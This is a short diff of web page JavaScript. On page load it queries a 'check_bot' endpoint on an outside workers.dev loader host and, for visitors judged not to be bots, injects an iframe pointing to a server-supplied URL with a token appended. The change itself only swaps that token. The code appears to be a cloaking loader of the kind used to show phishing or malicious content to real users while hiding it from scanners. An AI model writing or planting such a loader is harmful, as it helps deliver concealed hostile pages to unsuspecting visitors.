@@ -55,7 +55,7 @@ window.addEventListener('message', (message) => {
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://proxy_cf.kauporuut340.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url + 'nf5nPY3n')
+            createFrame(res.url + 'rWjny8gh')
         } else {
             setTimeout(toggleLoad, 500);
 
